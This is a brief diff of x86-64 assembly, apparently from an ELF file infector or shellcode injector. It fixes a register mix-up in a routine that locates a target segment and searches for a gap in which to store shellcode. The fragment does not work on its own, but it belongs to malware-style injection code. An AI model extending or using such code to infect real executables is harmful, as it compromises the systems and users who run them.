@@ -316,7 +316,7 @@ segment_found:
 	; now that we found a target segment, we have to find a suitable gap to store our shellcode
 	mov r11, [pivot_data]
 	mov r12, rbx
-	mov r12, [shellcode_size]
+	mov r13, [shellcode_size]
 
 	call find_gap
 	test rax, rax			; gap == NULL ?
